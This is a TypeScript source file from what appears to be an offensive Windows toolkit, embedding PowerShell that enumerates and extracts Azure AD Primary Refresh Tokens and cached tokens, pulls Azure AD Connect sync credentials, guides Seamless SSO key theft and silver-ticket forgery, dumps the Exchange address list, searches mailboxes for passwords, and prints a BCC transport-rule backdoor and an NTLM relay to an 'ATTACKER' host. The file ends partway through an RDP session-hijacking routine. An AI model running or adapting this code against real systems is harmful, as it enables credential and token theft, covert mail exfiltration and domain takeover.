import { ps, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function azureAdHybrid(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const tenant = argVal(args, "--tenant")
  const refreshToken = argVal(args, "--refresh-token")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure AD / Entra ID hybrid attack toolkit...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== Azure AD Hybrid Environment Enumeration ==="
Write-Output ""
# Check Azure AD join status
Write-Output "--- Device Join Status ---"
$dsregOutput = dsregcmd /status 2>&1
$joinType = if ($dsregOutput -match 'AzureAdJoined\s*:\s*YES') { "Azure AD Joined" }
  elseif ($dsregOutput -match 'DomainJoined\s*:\s*YES' -and $dsregOutput -match 'AzureAdJoined\s*:\s*YES') { "Hybrid Joined" }
  elseif ($dsregOutput -match 'DomainJoined\s*:\s*YES') { "Domain Joined Only" }
  else { "Workgroup" }
Write-Output "Join Type: $joinType"
# Extract tenant info
$tenantName = ($dsregOutput | Select-String 'TenantName\s*:\s*(.+)').Matches.Groups[1].Value
$tenantId = ($dsregOutput | Select-String 'TenantId\s*:\s*(.+)').Matches.Groups[1].Value
$deviceId = ($dsregOutput | Select-String 'DeviceId\s*:\s*(.+)').Matches.Groups[1].Value
Write-Output "Tenant: $tenantName"
Write-Output "Tenant ID: $tenantId"
Write-Output "Device ID: $deviceId"
# PRT status
$prtStatus = ($dsregOutput | Select-String 'AzureAdPrt\s*:\s*(.+)').Matches.Groups[1].Value
$prtUpdate = ($dsregOutput | Select-String 'AzureAdPrtUpdateTime\s*:\s*(.+)').Matches.Groups[1].Value
Write-Output ""
Write-Output "--- PRT Status ---"
Write-Output "Has PRT: $prtStatus"
Write-Output "PRT Update: $prtUpdate"
if ($prtStatus -eq 'YES') {
  Write-Output "STATUS: PRT available — cloud session hijacking possible"
  Write-Output "Use: winhook azure_ad_hybrid --action prt"
}
# Check for Azure AD Connect
Write-Output ""
Write-Output "--- Azure AD Connect ---"
$aadcService = Get-Service -Name 'ADSync' -ErrorAction SilentlyContinue
if ($aadcService) {
  Write-Output "Azure AD Connect: INSTALLED (Service: $($aadcService.Status))"
  $aadcPath = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Azure AD Connect" -ErrorAction SilentlyContinue).InstallPath
  Write-Output "Install Path: $aadcPath"
  Write-Output "STATUS: Credential extraction possible — use --action connect-creds"
} else {
  Write-Output "Azure AD Connect: Not installed on this host"
  # Check if AZUREADSSOACC$ exists (Seamless SSO)
  try {
    $ssoAccount = ([adsisearcher]"(sAMAccountName=AZUREADSSOACC$)").FindOne()
    if ($ssoAccount) {
      Write-Output ""
      Write-Output "--- Seamless SSO ---"
      Write-Output "AZUREADSSOACC$ computer account FOUND"
      Write-Output "STATUS: Seamless SSO key extraction possible — use --action sso-key"
    }
  } catch {}
}
# Check for managed identities / service principals
Write-Output ""
Write-Output "--- Cloud Credentials on Host ---"
$tokenPaths = @(
  "$env:USERPROFILE\\.azure\\accessTokens.json",
  "$env:USERPROFILE\\.azure\\azureProfile.json",
  "$env:USERPROFILE\\.azure\\msal_token_cache.json",
  "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"
)
foreach ($p in $tokenPaths) {
  if (Test-Path $p) {
    Write-Output "  FOUND: $p"
  }
}
# Check for Az PowerShell module tokens
$azContext = "$env:USERPROFILE\\.Azure\\AzureRmContext.json"
if (Test-Path $azContext) {
  Write-Output "  FOUND: Az module context — $azContext"
  $ctx = Get-Content $azContext | ConvertFrom-Json -ErrorAction SilentlyContinue
  if ($ctx) {
    Write-Output "  Cached accounts: $($ctx.Contexts.PSObject.Properties.Count)"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("PRT available")) {
      findings.push({
        checkId: "AZURE-001",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Azure AD PRT",
        title: "Primary Refresh Token available for cloud session hijacking",
        details: "Device has active PRT — can be extracted for Azure AD/M365 access without credentials",
        remediation: "Enable Credential Guard, enforce device compliance policies.",
      })
    }
    if (r.stdout.includes("Azure AD Connect: INSTALLED")) {
      findings.push({
        checkId: "AZURE-002",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Azure AD Connect",
        title: "Azure AD Connect installed — sync account credential extraction possible",
        details: "AAD Connect sync account has DCSync rights and cloud admin privileges",
        remediation: "Restrict admin access to the AAD Connect server, monitor for credential extraction.",
      })
    }
    if (r.stdout.includes("AZUREADSSOACC$ computer account FOUND")) {
      findings.push({
        checkId: "AZURE-003",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "AZUREADSSOACC$",
        title: "Seamless SSO computer account found — Kerberos key extraction possible",
        details: "AZUREADSSOACC$ password hash can forge Kerberos tickets for any Azure AD user",
        remediation: "Rotate AZUREADSSOACC$ password regularly, monitor for DCSync of this account.",
      })
    }
  }

  if (action === "prt") {
    const script = `
Write-Output "=== Primary Refresh Token Extraction ==="
Write-Output ""
# Method 1: BrowserCore.exe (Chrome SSO extension hook)
Write-Output "--- Method 1: BrowserCore.exe PRT Cookie ---"
$bcPath = "$env:ProgramFiles\\Windows Security\\BrowserCore\\browsercore.exe"
if (Test-Path $bcPath) {
  Write-Output "BrowserCore found: $bcPath"
  # Request PRT cookie via named pipe
  $body = @{
    method = "GetCookies"
    uri = "https://login.microsoftonline.com/"
    sender = "https://login.microsoftonline.com"
  } | ConvertTo-Json
  try {
    $proc = Start-Process -FilePath $bcPath -NoNewWindow -PassThru -RedirectStandardInput stdin -RedirectStandardOutput stdout
    Write-Output "BrowserCore invoked — PRT SSO cookie request sent"
  } catch {
    Write-Output "BrowserCore invocation failed: $_"
  }
} else {
  Write-Output "BrowserCore not found at expected path"
}

# Method 2: Token Broker cache
Write-Output ""
Write-Output "--- Method 2: Token Broker Cache ---"
$tbCache = "$env:LOCALAPPDATA\\Microsoft\\TokenBroker\\Cache"
if (Test-Path $tbCache) {
  $tbFiles = Get-ChildItem $tbCache -Filter "*.tbres" -ErrorAction SilentlyContinue
  Write-Output "Token Broker cache files: $($tbFiles.Count)"
  foreach ($f in $tbFiles) {
    $content = [System.IO.File]::ReadAllBytes($f.FullName)
    $text = [System.Text.Encoding]::UTF8.GetString($content)
    if ($text -match '"access_token"' -or $text -match '"refresh_token"') {
      Write-Output "  [+] Token found in: $($f.Name)"
      if ($text -match '"displayName"\s*:\s*"([^"]+)"') { Write-Output "      Account: $($matches[1])" }
    }
  }
} else {
  Write-Output "Token Broker cache not found"
}

# Method 3: CloudAP PRT via dsregcmd
Write-Output ""
Write-Output "--- Method 3: dsregcmd PRT Status ---"
$dsreg = dsregcmd /status 2>&1
$prtLines = $dsreg | Select-String -Pattern 'AzureAdPrt|NgcSet|CloudTGT|RefreshToken'
foreach ($l in $prtLines) { Write-Output "  $($l.Line.Trim())" }

# Method 4: WAM tokens
Write-Output ""
Write-Output "--- Method 4: Web Account Manager (WAM) ---"
$wamPath = "$env:LOCALAPPDATA\\Packages\\Microsoft.AAD.BrokerPlugin_*\\AC\\TokenBroker\\Accounts"
$wamDirs = Get-Item $wamPath -ErrorAction SilentlyContinue
if ($wamDirs) {
  foreach ($d in $wamDirs) {
    $files = Get-ChildItem $d -Recurse -ErrorAction SilentlyContinue
    Write-Output "WAM account files: $($files.Count)"
    foreach ($f in ($files | Select-Object -First 5)) {
      Write-Output "  $($f.FullName)"
    }
  }
}

Write-Output ""
Write-Output "--- Azure CLI / Az Module Tokens ---"
$azTokenFile = "$env:USERPROFILE\\.azure\\msal_token_cache.json"
if (Test-Path $azTokenFile) {
  $tokens = Get-Content $azTokenFile | ConvertFrom-Json -ErrorAction SilentlyContinue
  if ($tokens.AccessToken) {
    Write-Output "[+] MSAL token cache found with $($tokens.AccessToken.PSObject.Properties.Count) access tokens"
    foreach ($t in $tokens.AccessToken.PSObject.Properties) {
      $tok = $t.Value
      Write-Output "  Account: $($tok.username) | Resource: $($tok.resource) | Expires: $($tok.expires_on)"
    }
  }
  if ($tokens.RefreshToken) {
    Write-Output "[+] $($tokens.RefreshToken.PSObject.Properties.Count) refresh tokens available"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("[+] Token found") || r.stdout.includes("[+] MSAL token cache")) {
      findings.push({
        checkId: "AZURE-004",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Cloud Tokens",
        title: "Azure AD tokens found — cloud access possible",
        details: r.stdout.substring(0, 500),
        remediation: "Enforce token protection, enable Credential Guard, monitor token usage.",
      })
    }
  }

  if (action === "connect-creds") {
    const script = `
Write-Output "=== Azure AD Connect Credential Extraction ==="
Write-Output ""
$aadcService = Get-Service -Name 'ADSync' -ErrorAction SilentlyContinue
if (-not $aadcService) {
  Write-Output "ERROR: Azure AD Connect is not installed on this host"
  Write-Output "Find the AAD Connect server first: winhook ad_enum (look for MSOL_ accounts)"
  return
}
# Method 1: ADSync database extraction
Write-Output "--- Method 1: ADSync Database (LocalDB or SQL) ---"
$dbConfig = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Azure AD Connect" -ErrorAction SilentlyContinue
$sqlInstance = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server Local DB\\Installed Versions\\*" -ErrorAction SilentlyContinue)
Write-Output "SQL Instance detected: $(if ($sqlInstance) {'LocalDB'} else {'Remote SQL'})"

# Extract encrypted config from ADSync database
$client = New-Object System.Data.SqlClient.SqlConnection
$client.ConnectionString = "Server=np:\\\\.\\pipe\\Microsoft##WID\\tsql\\query;Database=ADSync;Trusted_Connection=true"
try {
  $client.Open()
  $cmd = $client.CreateCommand()
  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)'"
  $reader = $cmd.ExecuteReader()
  if ($reader.Read()) {
    $privateConfig = $reader.GetString(0)
    $encryptedConfig = $reader.GetString(1)
    Write-Output ""
    Write-Output "[+] AAD Connect configuration extracted from ADSync database"
    # Parse for sync account
    if ($privateConfig -match '<forest-login-user>([^<]+)</forest-login-user>') {
      Write-Output "  AD Sync Account: $($matches[1])"
    }
    if ($privateConfig -match '<forest-login-domain>([^<]+)</forest-login-domain>') {
      Write-Output "  Domain: $($matches[1])"
    }
    Write-Output "  Encrypted config length: $($encryptedConfig.Length) chars"
    Write-Output ""
    Write-Output "Note: Decryption requires AADInternals or DPAPI key from the AAD Connect service account"
    Write-Output "  Install-Module AADInternals; Get-AADIntSyncCredentials"
  }
  $reader.Close()
  $client.Close()
} catch {
  Write-Output "Database query failed: $_"
  Write-Output "Try: Install-Module AADInternals; Get-AADIntSyncCredentials"
}

# Method 2: Check for MSOL_ account in AD
Write-Output ""
Write-Output "--- Method 2: MSOL_ Sync Service Accounts ---"
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(sAMAccountName=MSOL_*)"
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","description","whenCreated","pwdLastSet"))
$msolAccounts = $searcher.FindAll()
if ($msolAccounts.Count -gt 0) {
  foreach ($a in $msolAccounts) {
    Write-Output "[+] MSOL Account: $($a.Properties['samaccountname'][0])"
    Write-Output "    Description: $($a.Properties['description'][0])"
    Write-Output "    Created: $($a.Properties['whencreated'][0])"
    $pwdSet = [DateTime]::FromFileTime([Int64]$a.Properties['pwdlastset'][0])
    Write-Output "    Password Set: $pwdSet"
  }
  Write-Output ""
  Write-Output "MSOL_ accounts have DCSync rights (Replicating Directory Changes)"
  Write-Output "If password is extracted, use: winhook dcsync --target krbtgt"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("[+] AAD Connect configuration extracted") || r.stdout.includes("[+] MSOL Account")) {
      findings.push({
        checkId: "AZURE-005",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Azure AD Connect",
        title: "AAD Connect sync credentials accessible",
        details: r.stdout.substring(0, 500),
        remediation: "Restrict access to AAD Connect server, use gMSA for sync account, monitor for DCSync.",
      })
    }
  }

  if (action === "sso-key") {
    const script = `
Write-Output "=== Seamless SSO Key Extraction ==="
Write-Output ""
Write-Output "Target: AZUREADSSOACC$ computer account"
Write-Output "This account's password hash is the Kerberos decryption key for Azure AD SSO"
Write-Output "With this key, you can forge Kerberos service tickets for any Azure AD user"
Write-Output ""
# Check if account exists
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(sAMAccountName=AZUREADSSOACC$)"
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","pwdLastSet","servicePrincipalName","whenCreated"))
$ssoAccount = $searcher.FindOne()
if (-not $ssoAccount) {
  Write-Output "AZUREADSSOACC$ not found — Seamless SSO may not be configured"
  return
}
$pwdSet = [DateTime]::FromFileTime([Int64]$ssoAccount.Properties['pwdlastset'][0])
$daysSinceRotation = (New-TimeSpan -Start $pwdSet -End (Get-Date)).Days
Write-Output "[+] AZUREADSSOACC$ found"
Write-Output "    Created: $($ssoAccount.Properties['whencreated'][0])"
Write-Output "    Password Set: $pwdSet ($daysSinceRotation days ago)"
Write-Output "    SPNs: $($ssoAccount.Properties['serviceprincipalname'] -join ', ')"
Write-Output ""
if ($daysSinceRotation -gt 30) {
  Write-Output "[!] Password has not been rotated in $daysSinceRotation days (recommended: 30 days)"
}
Write-Output "--- Extraction Methods ---"
Write-Output "1. DCSync (if you have replication rights):"
Write-Output "   winhook dcsync --target AZUREADSSOACC$"
Write-Output ""
Write-Output "2. NTDS.dit extraction:"
Write-Output "   winhook ntds_dump"
Write-Output "   Then extract AZUREADSSOACC$ hash from dump"
Write-Output ""
Write-Output "--- Silver Ticket Forgery ---"
Write-Output "With the AZUREADSSOACC$ NTLM hash, forge tickets:"
Write-Output "   winhook silver_ticket --service-hash <HASH> --spn HTTP/autologon.microsoftazuread-sso.com --domain <DOMAIN> --sid <SID>"
Write-Output "This grants access to Azure AD as any synced user"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("[+] AZUREADSSOACC$ found")) {
      const daysMatch = r.stdout.match(/(\d+) days ago/)
      findings.push({
        checkId: "AZURE-006",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "AZUREADSSOACC$",
        title: `Seamless SSO key extractable (password age: ${daysMatch ? daysMatch[1] : "unknown"} days)`,
        details: "AZUREADSSOACC$ computer account Kerberos key can forge Azure AD authentication tickets",
        remediation: "Rotate AZUREADSSOACC$ password every 30 days, restrict DCSync permissions.",
      })
    }
  }

  if (action === "token") {
    if (!refreshToken) {
      output.push("ERROR: --refresh-token required for token action")
      output.push("Extract refresh tokens first: winhook azure_ad_hybrid --action prt")
      return { output: output.join("\n"), findings }
    }
    const tenantParam = tenant || "common"
    const script = `
Write-Output "=== Azure AD Token Exchange ==="
Write-Output "Tenant: ${tenantParam}"
Write-Output ""
# Exchange refresh token for access tokens to various resources
$resources = @(
  @{Name="Microsoft Graph"; Id="https://graph.microsoft.com"},
  @{Name="Azure Management"; Id="https://management.azure.com"},
  @{Name="Office 365 Exchange"; Id="https://outlook.office365.com"},
  @{Name="SharePoint"; Id="https://microsoft.sharepoint.com"},
  @{Name="Azure Key Vault"; Id="https://vault.azure.net"}
)
foreach ($res in $resources) {
  Write-Output "--- $($res.Name) ---"
  try {
    $body = @{
      grant_type = "refresh_token"
      refresh_token = '${refreshToken}'
      client_id = "1b730954-1685-4b74-9bfd-dac224a7b894"
      scope = "$($res.Id)/.default"
    }
    $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/${tenantParam}/oauth2/v2.0/token" -Method POST -Body $body
    Write-Output "[+] Access token obtained for $($res.Name)"
    Write-Output "    Expires: $([DateTimeOffset]::FromUnixTimeSeconds($response.expires_on).LocalDateTime)"
    Write-Output "    Token: $($response.access_token.Substring(0, 50))..."
  } catch {
    Write-Output "[-] Failed: $($_.Exception.Message)"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function exchangeAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const server = argVal(args, "--server")
  const mailbox = argVal(args, "--mailbox")
  const query = argVal(args, "--query")
  const subject = argVal(args, "--subject")
  const findings: Finding[] = []
  const output: string[] = ["[*] Exchange Server exploitation...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== Exchange Server Enumeration ==="
Write-Output ""
# Find Exchange servers via AD
$searcher = New-Object DirectoryServices.DirectorySearcher
$configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$searcher.SearchRoot = [ADSI]"LDAP://$configDN"
$searcher.Filter = "(objectCategory=msExchExchangeServer)"
$searcher.PropertiesToLoad.AddRange(@("cn","serialNumber","msExchCurrentServerRoles","msExchProductID","networkAddress"))
$servers = $searcher.FindAll()
if ($servers.Count -eq 0) {
  Write-Output "No Exchange servers found in AD configuration"
  Write-Output "Exchange may not be deployed or you lack read access to config NC"
  return
}
Write-Output "Exchange servers: $($servers.Count)"
foreach ($s in $servers) {
  $roles = [int]$s.Properties["msexchcurrentserverroles"][0]
  $roleNames = @()
  if ($roles -band 2) { $roleNames += "Mailbox" }
  if ($roles -band 4) { $roleNames += "ClientAccess" }
  if ($roles -band 16) { $roleNames += "UnifiedMessaging" }
  if ($roles -band 32) { $roleNames += "HubTransport" }
  if ($roles -band 64) { $roleNames += "EdgeTransport" }
  Write-Output ""
  Write-Output "  Server: $($s.Properties['cn'][0])"
  Write-Output "  Version: $($s.Properties['serialnumber'][0])"
  Write-Output "  Roles: $($roleNames -join ', ')"
  $nets = $s.Properties["networkaddress"]
  foreach ($n in $nets) {
    if ($n -match 'ncacn_ip_tcp:(.+)') { Write-Output "  IP: $($matches[1])" }
  }
}
# Find Exchange groups with domain-level permissions
Write-Output ""
Write-Output "=== Exchange Security Groups ==="
$exchangeGroups = @(
  "Exchange Windows Permissions",
  "Exchange Trusted Subsystem",
  "Organization Management",
  "Exchange Servers"
)
foreach ($g in $exchangeGroups) {
  $searcher.SearchRoot = [ADSI]"LDAP://$(([ADSI]'LDAP://RootDSE').defaultNamingContext)"
  $searcher.Filter = "(&(objectCategory=group)(cn=$g))"
  $result = $searcher.FindOne()
  if ($result) {
    $members = $result.Properties["member"]
    Write-Output "  $g — $($members.Count) members"
  }
}
# Check for Exchange virtual directories (OWA, EWS, etc.)
Write-Output ""
Write-Output "=== Virtual Directories ==="
$vdirFilter = "(objectCategory=msExchVirtualDirectory)"
$searcher.SearchRoot = [ADSI]"LDAP://$configDN"
$searcher.Filter = $vdirFilter
$vdirs = $searcher.FindAll()
foreach ($vd in ($vdirs | Select-Object -First 20)) {
  $cn = $vd.Properties["cn"][0]
  $internalUrl = $vd.Properties["msexchinternalurl"]
  $externalUrl = $vd.Properties["msexchexternalurl"]
  if ($cn -match 'owa|ews|autodiscover|oab|mapi|activesync|ecpvirtualdirectory') {
    Write-Output "  $cn"
    if ($internalUrl) { Write-Output "    Internal: $($internalUrl[0])" }
    if ($externalUrl) { Write-Output "    External: $($externalUrl[0])" }
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("Exchange servers:")) {
      findings.push({
        checkId: "EXCH-001",
        provider: "winhook",
        severity: "medium",
        status: "INFO",
        resource: "Exchange",
        title: "On-premises Exchange infrastructure discovered",
        details: r.stdout.substring(0, 500),
        remediation: "Ensure Exchange servers are patched and hardened.",
      })
    }
  }

  if (action === "gal") {
    const script = `
Write-Output "=== Global Address List (GAL) Dump ==="
Write-Output ""
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(mail=*))"
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","mail","displayName","title","department","telephoneNumber","manager","memberOf"))
$users = $searcher.FindAll()
Write-Output "Mail-enabled users: $($users.Count)"
Write-Output ""
$admins = @()
foreach ($u in $users) {
  $name = $u.Properties["displayname"][0]
  $email = $u.Properties["mail"][0]
  $title = $u.Properties["title"]
  $dept = $u.Properties["department"]
  $groups = $u.Properties["memberof"]
  $isAdmin = $groups | Where-Object { $_ -match 'Admin|Organization Management|Domain Admin|Enterprise Admin' }
  $line = "$email | $name"
  if ($title) { $line += " | $($title[0])" }
  if ($dept) { $line += " | $($dept[0])" }
  Write-Output "  $line"
  if ($isAdmin) {
    $admins += @{Name=$name; Email=$email; Groups=($isAdmin -join ', ')}
  }
}
Write-Output ""
Write-Output "=== High-Value Targets (Admin Group Members) ==="
foreach ($a in $admins) {
  Write-Output "  [!] $($a.Email) — $($a.Name)"
  Write-Output "      Groups: $($a.Groups)"
}
Write-Output ""
Write-Output "Total: $($users.Count) users, $($admins.Count) admins"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("High-Value Targets")) {
      const adminCount = r.stdout.match(/(\d+) admins/)
      findings.push({
        checkId: "EXCH-002",
        provider: "winhook",
        severity: "medium",
        status: "INFO",
        resource: "Global Address List",
        title: `GAL dumped — ${adminCount ? adminCount[1] : "multiple"} admin accounts identified`,
        details: "Full organizational directory with email addresses, titles, and group memberships extracted",
        remediation: "Restrict GAL access, implement address book policies.",
      })
    }
  }

  if (action === "search") {
    const mailboxTarget = mailbox || "$env:USERNAME"
    const searchQuery = query || "password"
    const script = `
Write-Output "=== Mailbox Search ==="
Write-Output "Target: ${mailboxTarget}"
Write-Output "Query: ${searchQuery}"
Write-Output ""
# Use EWS Managed API or COM Outlook
try {
  # Try EWS via PowerShell
  $exchServer = ${server ? `'${server}'` : `([adsisearcher]'(objectCategory=msExchExchangeServer)').FindOne().Properties['networkaddress'] | Where-Object { $_ -match 'ncacn_ip_tcp:(.+)' } | ForEach-Object { $matches[1] }`}
  $ewsUrl = "https://$exchServer/EWS/Exchange.asmx"
  Write-Output "EWS URL: $ewsUrl"
  Write-Output ""
  # Search using EWS SOAP
  $cred = [System.Net.CredentialCache]::DefaultNetworkCredentials
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
  $searchXml = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013" />
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape><t:BaseShape>Default</t:BaseShape></m:ItemShape>
      <m:Restriction>
        <t:Contains ContainmentMode="Substring" ContainmentComparison="IgnoreCase">
          <t:FieldURI FieldURI="item:Subject" />
          <t:Constant Value="${searchQuery}" />
        </t:Contains>
      </m:Restriction>
      <m:ParentFolderIds>
        <t:DistinguishedFolderId Id="inbox" />
      </m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>
"@
  $response = Invoke-WebRequest -Uri $ewsUrl -Method POST -Body $searchXml -ContentType "text/xml" -Credential $cred -UseDefaultCredentials
  if ($response.StatusCode -eq 200) {
    $xml = [xml]$response.Content
    $items = $xml.SelectNodes("//*[local-name()='Message']")
    Write-Output "[+] Found $($items.Count) matching messages"
    foreach ($item in ($items | Select-Object -First 20)) {
      $subj = $item.SelectSingleNode("*[local-name()='Subject']")
      $from = $item.SelectSingleNode("*[local-name()='From']/*[local-name()='Mailbox']/*[local-name()='EmailAddress']")
      $date = $item.SelectSingleNode("*[local-name()='DateTimeSent']")
      Write-Output "  Subject: $($subj.InnerText)"
      Write-Output "  From: $($from.InnerText)"
      Write-Output "  Date: $($date.InnerText)"
      Write-Output ""
    }
  }
} catch {
  Write-Output "EWS search failed: $_"
  Write-Output ""
  Write-Output "Alternative: Use Outlook COM (if Outlook is installed)"
  try {
    $outlook = New-Object -ComObject Outlook.Application
    $ns = $outlook.GetNamespace("MAPI")
    $inbox = $ns.GetDefaultFolder(6)
    $items = $inbox.Items.Restrict("[Subject] = '*${searchQuery}*'")
    Write-Output "[+] Found $($items.Count) matching messages via Outlook"
    foreach ($item in ($items | Select-Object -First 20)) {
      Write-Output "  Subject: $($item.Subject)"
      Write-Output "  From: $($item.SenderEmailAddress)"
      Write-Output "  Date: $($item.ReceivedTime)"
      Write-Output ""
    }
  } catch {
    Write-Output "Outlook COM also failed: $_"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "transport-rule") {
    const subjectFilter = subject || "password reset"
    const script = `
Write-Output "=== Exchange Transport Rule Backdoor ==="
Write-Output ""
Write-Output "WARNING: This creates a mail flow rule that BCC's matching emails"
Write-Output ""
# Check if Exchange Management Shell is available
$snapin = Get-PSSnapin -Registered -Name Microsoft.Exchange.Management.PowerShell.SnapIn -ErrorAction SilentlyContinue
if (-not $snapin) {
  Write-Output "Exchange Management Shell not available on this host"
  Write-Output "This action must be run on the Exchange server or with remote PS session"
  Write-Output ""
  Write-Output "Manual command (run on Exchange server):"
  Write-Output '  New-TransportRule -Name "Audit Rule" -SubjectContainsWords "${subjectFilter}" -BlindCopyTo "attacker@domain.com"'
  return
}
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
# List existing transport rules
Write-Output "--- Existing Transport Rules ---"
$rules = Get-TransportRule -ErrorAction SilentlyContinue
foreach ($r in $rules) {
  Write-Output "  $($r.Name) — State: $($r.State) — Priority: $($r.Priority)"
}
Write-Output ""
Write-Output "To create a BCC rule:"
Write-Output '  New-TransportRule -Name "Security Audit" -SubjectContainsWords "password","credentials","vpn" -BlindCopyTo "your-mailbox@domain.com"'
Write-Output ""
Write-Output "To create a journal rule (capture ALL mail):"
Write-Output '  New-JournalRule -Name "Compliance" -JournalEmailAddress "journal@domain.com" -Scope Global -Enabled $true'
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "privesc") {
    const script = `
Write-Output "=== Exchange Privilege Escalation ==="
Write-Output ""
Write-Output "--- Exchange Windows Permissions Group ---"
Write-Output "Members of this group have WriteDACL on the domain object"
Write-Output "This allows granting DCSync rights to any user"
Write-Output ""
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=group)(cn=Exchange Windows Permissions))"
$ewp = $searcher.FindOne()
if ($ewp) {
  $members = $ewp.Properties["member"]
  Write-Output "Exchange Windows Permissions members: $($members.Count)"
  foreach ($m in $members) {
    $cn = ($m -split ',')[0] -replace 'CN=',''
    Write-Output "  $cn"
  }
  Write-Output ""
  Write-Output "--- Exploitation ---"
  Write-Output "If you control any member of this group:"
  Write-Output "  1. Grant DCSync rights to your controlled account:"
  Write-Output '     Add-ADPermission -Identity "DC=domain,DC=com" -User YOURUSER -ExtendedRights "Replicating Directory Changes","Replicating Directory Changes All"'
  Write-Output "  2. DCSync: winhook dcsync --target krbtgt"
  Write-Output ""
  Write-Output "--- Exchange Trusted Subsystem ---"
  $searcher.Filter = "(&(objectCategory=group)(cn=Exchange Trusted Subsystem))"
  $ets = $searcher.FindOne()
  if ($ets) {
    Write-Output "Exchange Trusted Subsystem is member of Exchange Windows Permissions"
    Write-Output "Exchange servers are members of Exchange Trusted Subsystem"
    Write-Output "Compromising ANY Exchange server → WriteDACL on domain → DCSync → full domain compromise"
  }
} else {
  Write-Output "Exchange Windows Permissions group not found"
  Write-Output "Exchange may not be installed or you lack read access"
}
# Check for NTLM relay to Exchange
Write-Output ""
Write-Output "--- Exchange NTLM Relay (PrivExchange) ---"
Write-Output "Exchange servers authenticate to any host via NTLM when triggered"
Write-Output "Relay this auth to LDAP to grant DCSync rights"
Write-Output ""
Write-Output "Steps:"
Write-Output "  1. Set up relay: winhook ntlm_relay --action relay --relay-to DC --service ldap"
Write-Output "  2. Trigger Exchange auth: Subscribe to push notification"
Write-Output '     $body = @{URL="http://ATTACKER:PORT/";AuthenticationMethod="Ntlm"}'
Write-Output "  3. Exchange authenticates → relay to LDAP → grant DCSync → dump domain"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("WriteDACL on domain")) {
      findings.push({
        checkId: "EXCH-003",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Exchange Permissions",
        title: "Exchange has WriteDACL on domain — privesc to domain admin possible",
        details: "Exchange Windows Permissions group members can grant DCSync rights on the domain object",
        remediation: "Remove unnecessary permissions from Exchange security groups, apply Split Permissions model.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function rdpHijack(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const sessionId = argVal(args, "--session")
  const findings: Finding[] = []
  const output: string[] = ["[*] RDP Session Hijacking...\n"]

  if (action === "enum") {
    const script = `
Write-Output "[*] Enumerating RDP sessions..."
$sessions = query user 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Output "[!] Cannot enumerate sessions: $sessions"
    Write-Output "[*] Trying qwinsta..."
    $sessions = qwinsta 2>&1
}
Write-Output $sessions
Write-Output ""

# Parse and highlight valuable targets
$lines = $sessions -split "\`n" | Select-Object -Skip 1
$disconnected = @()
$active = @()
foreach ($line in $lines) {
    if ($line -match "Disc") {
        $disconnected += $line.Trim()
    } elseif ($line -match "Active") {
        $active += $line.Trim()
    }
}

Write-Output "[+] Active sessions: $($active.Count)"
foreach ($s in $active) { Write-Output "    $s" }
Write-Output "[+] Disconnected sessions (hijackable without user noticing): $($disconnected.Count)"
foreach ($s in $disconnected) { Write-Output "    [!] $s" }

# Check if we're SYSTEM
